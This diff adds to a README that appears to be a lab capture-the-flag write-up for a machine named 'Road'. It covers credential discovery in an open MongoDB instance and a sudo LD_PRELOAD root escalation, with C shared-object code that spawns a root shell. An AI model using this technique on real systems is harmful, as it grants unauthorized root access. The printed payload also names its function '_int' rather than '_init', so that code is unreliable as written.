@@ -249,3 +249,55 @@ Golang:
 Python3:
 
 ![python3_auto](../media/pictures/road_auto_py.png)
+
+## User Flag
+
+Once a foothold is gained (either via the automated tools in this repository or by manual exploitation) the user flag is located at `/home/webdeveloper/user.txt`.
+
+## PrivEsc (www-data --> webdeveloper)
+
+Taking a look at the target's open ports once we have a foothold on the machine reveals both MySQL and MongoDB running.
+
+![tcpports](../media/pictures/road_foothold_tcpports.png)
+
+Using the MongoDB CLI, we can navigate through the database without having to enter credentials. While going through the `backup` database, we discover `webdeveloper`'s credentials in one of the tables.
+
+![webdevcreds](../media/pictures/road_foothold_webdevcreds.png)
+
+Now that we have webdeveloper's password, we can close our reverse shell session and SSH into the target.
+
+## PrivEsc (webdeveloper --> root)
+
+Once we SSH in as webdeveloper, we can grab the `user.txt` flag (if we haven't done so already) and begin escalating to root.
+
+Running `sudo -l` we see webdeveloper can run `/usr/bin/sky_backup_utility` as root with no password. We also see that `env_keep+=LD_PRELOAD` is enabled for sudo.
+
+![sudoL](../media/pictures/road_privesc_sudoL.png)
+
+HackTricks has a good walkthrough on this that can be found [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path). Essentially, though, we create a shared object (.so) file that spawns a shell and have `LD_PRELOAD=<sharedobject>` when we execute the sudo command.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+void _int() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/bash");
+}
+```
+
+To compile the above into a shared object:
+
+```bash
+gcc -fPIC -shared -o ldbypass.so ldbypass.c
+```
+
+![ldbcompile](../media/pictures/road_privesc_ldbcompile.png)
+
+Running `sudo LD_PRELOAD=$(pwd)/ldbypass.so /usr/bin/sky_backup_utility` will drop you into a root shell. 
+
+Now that we have a root shell, we can navigate to `/root` and cat out `root.txt` to complete the room.
+
